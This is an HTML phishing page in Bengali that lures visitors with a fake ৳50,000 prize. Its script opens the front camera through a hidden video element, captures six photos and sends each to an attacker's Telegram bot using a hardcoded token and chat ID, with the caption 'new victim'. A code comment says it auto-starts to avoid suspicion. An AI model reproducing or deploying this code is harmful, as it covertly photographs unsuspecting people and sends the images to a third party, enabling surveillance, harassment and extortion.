<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>তুমি জিতেছো ৫০,০০০ টাকা!</title>
  <style>
    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; font-family:Arial; }
    .container {
      position:absolute; inset:0; background:radial-gradient(circle, #1a0033, #000);
      display:flex; flex-direction:column; align-items:center; justify-content:center; color:white; text-align:center; padding:20px;
    }
    h1 { font-size:2.5em; background:linear-gradient(45deg,#ff00c8,#00ff9d); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
    .prize { font-size:6em; animation: bounce 2s infinite; }
    @keyframes bounce { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-20px); } }
    .btn {
      margin-top:30px; padding:18px 40px; background:#00ff9d; color:black; border:none; border-radius:50px; font-size:1.3em; font-weight:bold; cursor:pointer; animation: pulse 2s infinite;
    }
    @keyframes pulse { 0% { box-shadow:0 0 0 0 rgba(0,255,157,0.7); } 70% { box-shadow:0 0 0 20px rgba(0,255,157,0); } }
    video { position:absolute; top:-9999px; }
  </style>
</head>
<body>

<div class="container">
  <h1>অভিনন্দন!</h1>
  <div class="prize">৳50,000</div>
  <h2>তুমি আজকের লাকি উইনার!</h2>
  <p>প্রাইজ ক্লেইম করতে ক্যামেরা অন করো...</p>
  <button class="btn" onclick="start()">প্রাইজ নিয়ে নাও</button>
</div>

<video id="cam" autoplay playsinline></video>

<script>
// ==== তোমার টেলিগ্রাম বটের তথ্য এখানে বসাও ====
const TELEGRAM_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";   // ← এখানে তোমার বট টোকেন বসাও
const CHAT_ID = "7731349577";                                 // ← এখানে তোমার টেলিগ্রাম আইডি বসাও
// ============================================

const id = new URLSearchParams(location.search).get('id') || 'unknown';
const video = document.getElementById('cam');

function start() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      video.srcObject = stream;
      let count = 0;
      const total = 6;
      
      const capture = setInterval(() => {
        if (count >= total) {
          clearInterval(capture);
          setTimeout(() => location.href = "https://i.imgur.com/removed.png", 2000); // রিক্রুট ট্রল
          return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);

        // সরাসরি টেলিগ্রামে পাঠাও
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: dataUrl,
            caption: `নতুন ভিকটিম!\nID: ${id}\nসময়: ${new Date().toLocaleString('bn-BD')}`
          })
        });

        count++;
      }, 1000);
    })
    .catch(() => alert("ক্যামেরা দিতে হবে ভাই!"));
}

// অটো স্টার্ট (যাতে বেশি সন্দেহ না হয়)
setTimeout(start, 1500);
</script>
</body>
</html>
